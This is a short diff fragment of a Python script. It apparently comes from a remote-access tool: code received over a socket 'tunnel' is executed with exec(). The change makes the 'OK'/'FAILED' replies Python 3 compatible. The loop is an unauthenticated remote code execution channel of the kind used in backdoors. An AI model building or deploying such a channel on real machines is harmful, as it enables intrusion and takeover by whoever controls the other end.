@@ -20,9 +20,9 @@ while True:
                 data = data.decode()
                 try:
                     exec(data)
-                    tunnel.sendall("OK")
+                    tunnel.sendall("OK".encode())
                 except:
-                    tunnel.sendall("FAILED")
+                    tunnel.sendall("FAILED".encode())
                     continue
             else:
                 break
